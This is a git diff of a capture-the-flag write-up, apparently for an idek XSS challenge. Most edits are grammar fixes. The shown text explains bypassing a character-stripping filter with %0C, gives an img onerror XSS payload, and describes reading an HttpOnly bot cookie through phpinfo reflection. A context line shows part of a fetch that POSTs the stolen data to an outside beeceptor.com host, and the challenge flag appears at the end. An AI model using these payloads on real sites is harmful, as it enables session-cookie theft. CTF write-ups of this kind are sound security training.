@@ -8,7 +8,7 @@
   3- bot.js
   4- nginx.conf**
 
-  **Flag is in the bot.js cookie with a httponly attribute this mean that JS cannot access the cookie**
+  **The flag is in the bot.js cookie with a httponly attribute this means that JS cannot access the cookie**
 
   **1-index.php**
   
@@ -16,7 +16,7 @@
 
   **so it is clear that we can get xss from the name get parameter but how?**
 
-  **The main problem is in the Enhanced_Trim function that replaces the defined char set with "" so how can we bypass it to make an alert?**
+  **The main problem is in the Enhanced_Trim function that replaces the defined charset with "" so how can we bypass it to make an alert?**
 
   **at first i looked for alternatives for the space and found that %0C can work so the payload to make a simple alert -> <img%0Csrc=x%0Conerror=alert``>**
 
@@ -28,7 +28,7 @@
 
   **so how we can use phpinfo to get the bot cookie?**
   
-  **when a user visits the phpinfo page it reflect its cookie in the response even the HttpOnly ones like this**
+  **when a user visits the phpinfo page it reflects its cookie in the response even the HttpOnly ones like this**
 
   ![phpinfo-dvwa-1](https://github.com/user-attachments/assets/fbce6706-e779-43e4-be72-60b4c27ef1cd)
 
@@ -56,12 +56,8 @@ then(data%0C=>%0Cfetch("https://qlashx.free.beeceptor.com/",%0C{method:"POST",%0
   ```
 
 
-  
-  ![image](https://github.com/user-attachments/assets/943c34c6-11f1-4835-81dd-e08e9c665855)
-
-
+    ![image](https://github.com/user-attachments/assets/943c34c6-11f1-4835-81dd-e08e9c665855)
 
 
 
 `flag -> idek{Ghazy_N3gm_Elbalad} `
-
